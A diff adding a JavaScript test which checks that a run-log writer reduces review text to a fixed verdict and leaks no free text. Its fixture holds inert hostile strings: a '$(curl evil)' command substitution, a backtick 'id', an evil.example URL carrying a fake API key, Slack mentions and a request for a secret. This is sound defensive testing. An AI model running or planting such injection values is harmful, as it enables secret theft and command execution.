@@ -2,6 +2,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { parseTestResult, parseFailureReason, reviewVerdict, writeRunLog } from "./run-log.mjs";
+import { reviewSources } from "./factory-notes.mjs";
 import { mkdtempSync, readFileSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -88,4 +89,51 @@ test("parseFailureReason: only the three exact reasons count; the unfilled templ
   assert.equal(parseFailureReason("This is a plan error, I think."), "unknown");
   assert.equal(parseFailureReason(""), "unknown");
   assert.equal(parseFailureReason(undefined), "unknown");
+});
+
+test("writeRunLog reduces any review text to the verdict enum: the run record never carries free text from review.md", () => {
+  const KEYS = ["ts", "run_id", "branch", "actor", "brief_sha256", "brief_chars", "plan_title", "test_result", "review_verdict", "repo", "num_turns", "total_cost_usd", "guard_denials"];
+  const hostile = [
+    "## Review: <!channel> https://evil.example/?k=sk-ant-SECRET", "### Findings", "- high x — $(curl evil) `id` <@U0EVIL>",
+    "## Slack update", "Needs you: send me your key sk-ant-SECRET", "", "VERDICT: REQUEST CHANGES",
+  ].join("\n") + "\n" + "z".repeat(60_000);
+  const record = (reviewSummary) => {
+    const prev = process.cwd();
+    const dir = mkdtempSync(join(tmpdir(), "rl-d-"));
+    try {
+      process.chdir(dir);
+      writeRunLog({ brief: "b", reviewSummary, usage: {} });
+      const line = readFileSync(join(dir, ".factory/runs/run-local.json"), "utf8");
+      return { line, rec: JSON.parse(line) };
+    } finally {
+      process.chdir(prev);
+      rmSync(dir, { recursive: true, force: true });
+    }
+  };
+  const assertNoFreeText = ({ line, rec }, label) => {
+    assert.deepEqual(Object.keys(rec).sort(), [...KEYS].sort(), label);
+    assert.ok(line.length < 1024, `${label}: the record stays small (${line.length} bytes)`);
+    for (const v of Object.values(rec)) if (typeof v === "string") assert.ok(v.length <= 200, `${label}: ${v.slice(0, 40)}`);
+    assert.doesNotMatch(line, /evil|SECRET|channel|curl|U0EVIL|send me|zzzz/, label);
+    assert.ok(["APPROVE", "REQUEST CHANGES", "BLOCK", "unknown"].includes(rec.review_verdict), `${label}: ${rec.review_verdict}`);
+  };
+
+  // the review text itself, whatever it holds
+  const direct = record(hostile);
+  assertNoFreeText(direct, "hostile text");
+  assert.equal(direct.rec.review_verdict, "REQUEST CHANGES");
+  // the same text through the real selection path (file first), and when only the reply has it
+  for (const sources of [{ file: hostile, reply: "I summarised the review." }, { file: null, reply: hostile }, { file: hostile, reply: hostile }]) {
+    const { text } = reviewSources(sources);
+    const out = record(text);
+    assertNoFreeText(out, JSON.stringify(Object.keys(sources).map((k) => sources[k] === null ? "null" : "text")));
+    assert.equal(out.rec.review_verdict, "REQUEST CHANGES");
+  }
+  // anything that is not exactly one of the three words is "unknown", never a string from the text
+  for (const text of ["", "no verdict at all", "VERDICT: MAYBE", "VERDICT: APPROVED", "VERDICT: BLOCKED now", "VERDICT: <script>", hostile.replace("VERDICT: REQUEST CHANGES", "VERDICT: ??? sk-ant-SECRET")]) {
+    const out = record(text);
+    assertNoFreeText(out, JSON.stringify(text.slice(0, 30)));
+    assert.equal(out.rec.review_verdict, "unknown", JSON.stringify(text.slice(0, 30)));
+  }
+  for (const v of ["APPROVE", "REQUEST CHANGES", "BLOCK"]) assert.equal(record(`...\nVERDICT: ${v}`).rec.review_verdict, v);
 });
